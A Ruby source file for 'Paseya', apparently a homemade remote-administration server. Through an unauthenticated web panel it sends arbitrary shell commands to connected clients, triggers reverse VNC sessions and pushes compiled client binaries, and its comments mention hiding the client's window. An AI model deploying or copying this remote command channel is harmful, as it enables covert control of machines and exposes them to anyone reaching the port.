# run as a service/daemon.  Letting clients attach and keeping track of them.
# v0.2 - move to eventmachine
# v0.1 - first

#**resources
#http://www.erikveen.dds.nl/rubyscript2exe/
#http://exerb.sourceforge.jp/index.en.html
#http://www.ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/TCPServer.html

#**todo.  who is the server.  How does the client know to look for the right IP?
#web interface?
#don't build client if you don't have to.  -v switch?
#get vnc over a file channel instead of the server copy
#don't block so damn much when compiling a new version of the client

#**done
#hide the ruby window?
	#gem install ocra
	#ocra paseya-client.rb --windows
#multiple threaded connections?
#secure connections? #authentication?

require 'rubygems'
require 'eventmachine'
require "base64"
require "logger"
require "fileutils"
p File.absolute_path($0)
require File.absolute_path($0).gsub(File.basename(__FILE__),'') + 'http_parser.rb'
require File.absolute_path($0).gsub(File.basename(__FILE__),'') + 'paseya-base.rb'


class PaseyaClientServer < EventMachine::Connection
	include PaseyaBase
	
	def post_init
		start_tls if @useClientSSL
		@l.info("Serving to a new client with server instance #{object_id}.")
		EventMachine::add_periodic_timer(30){self.timer}
	end	
	
	def PaseyaClientServer.findTarget(ipPort)
		ObjectSpace.each_object(PaseyaClientServer){|c|
			next if !c.get_peername
			port, ip = Socket.unpack_sockaddr_in(c.get_peername)
			return c if ipPort == [ip,port].join(':')
		}
		return nil
	end
	
	def timer
		send("version:")
	end
	
	def httpCommand(data)
		if data['action'] == 'cmd'
			send('cmd:' + data['cmd']) if data['cmd']
		end
		if data['action'] == 'reversevnc'
			send('reversevnc:' + data['host']) if data['host']
		end
		if data['action'] == 'quit'
			send('quit:') 
		end
	end
	
	#grab the file contents of the version of the client in our cwd
	#send it over the wire to the client
	def pushNewClient
		@l.info("attempting to push the new client out")
		#grab the newest version of the .rb file from our cwd, put it in the temp dir
		['paseya-client','paseya-base'].each{|baseName|
			clientFile = __FILE__.gsub(File.basename(__FILE__),'') + baseName
			if !File.exist?(clientFile+'.rb')
				@l.info("Not updating client because I can't find the local copy of the newest #{clientFile+'.rb'}")
				return
			end			
			FileUtils.cp(clientFile+'.rb',"#{ENV['TEMP']}")
		}
		tempExeFile = ENV['TEMP'] + "/" + 'paseya-client.bin'
		begin
			`ocra #{__FILE__.gsub(File.basename(__FILE__),'') + 'paseya-client.rb'} --output #{tempExeFile}`
				@l.info('done building new binary')
				fh = open(tempExeFile,"rb")
				file = fh.read()
				fh.close
				send('updateClient:'+Base64.encode64(file))			
		rescue
			@l.error("failure while trying to compile new client binary with OCRA.  Make sure you have the OCRA gem installed.")
		end
	end
	
	def pushVnc
		@l.info("attempting to push VNC out")
		#grab the newest version of the .rb file from our cwd, put it in the temp dir
		clientFile = __FILE__.gsub(File.basename(__FILE__),'') + @vncName
		if !File.exist?(clientFile)
			@l.info("Not pushing VNC because I can't find the local copy of #{clientFile}")
			return
		end
		begin
				fh = open(clientFile,"rb")
				file = fh.read()
				fh.close
				send('pushVnc:'+Base64.encode64(file))			
		rescue
			@l.error("failure while trying to compile new client binary with OCRA.  Make sure you have the OCRA gem installed.")
		end
	end	
	
	def processCommand(string)
		string = Base64.decode64(string)
		p string
		if string.to_s =~ /version:(.*)/
			if $1.to_s != @@newestClientVersion.to_s
				pushNewClient
			else
				p "version up to date"
			end
		end
		if string.to_s =~ /sendVnc:/
			pushVnc
		end		
	end
	
	def unbind()
		@l.info("Ending connection #{object_id}")
	end
end

class PaseyaHttpServer  <EventMachine::Connection
	include PaseyaBase
		
	def index
		body = 'no clients'
		body = '' 
		ObjectSpace.each_object(PaseyaClientServer){|i|
			next if !i.get_peername
			port, ip = Socket.unpack_sockaddr_in(i.get_peername)
			body << ip.to_s + ":" + port.to_s + 
				"<a href='?target=#{ip.to_s}:#{port.to_s}&action=quit'>quit</a>" +
				"<a href='?target=#{ip.to_s}:#{port.to_s}&action=reversevnc&host=192.168.225.101'>vnc</a>" +
				"<a href='?target=#{ip.to_s}:#{port.to_s}&action=cmd&cmd=dir'>dir</a>" +
				"<br />"
		}
		response = []
		response << "HTTP/1.1 200 OK"
		response << "Server: Paseya"
		response << "Content-length: #{body.length}"
		response << "Content-Type: text/html; charset=UTF-8"
		response << "\n" + body +"\n\n"
		send_data(response.join("\n"))
		close_connection_after_writing()
	end
	
	def receive_data(data)
		@l.info("#{object_id} Serving: #{data}")
		begin
			parsed = HTTPParser.new.parse(data)
		rescue
			@l.error("#{object_id} Could not interpret the request #{data}")
			return
		end
		if parsed[:uri][:path].to_s =~ /\?target=(.*)&action=([^&]*)(&data=(.*))*/
			temp = parsed[:uri][:path].to_s.split("&")
			uri = {}
			temp.map!{|u|
				if u =~ /(\?)*([^\=]*)=(.*)/
					uri[$2] = $3
				end
			}
			if t = PaseyaClientServer.findTarget(uri['target'])			
				if t != nil and m = t.method(:httpCommand)
					m.call(uri)
				end
			end
		end
		index if parsed[:method] == 'GET'
		#p parsed.uri
  end
end

class PaseyaServer
	include PaseyaBase
		
	def run
		EventMachine::start_server('0.0.0.0', @@httpPort, PaseyaHttpServer)
		EventMachine::start_server('0.0.0.0', @@clientPort, PaseyaClientServer)		
	end
end


EventMachine.run {
	a = PaseyaServer.new.run
	p Dir.pwd()
}

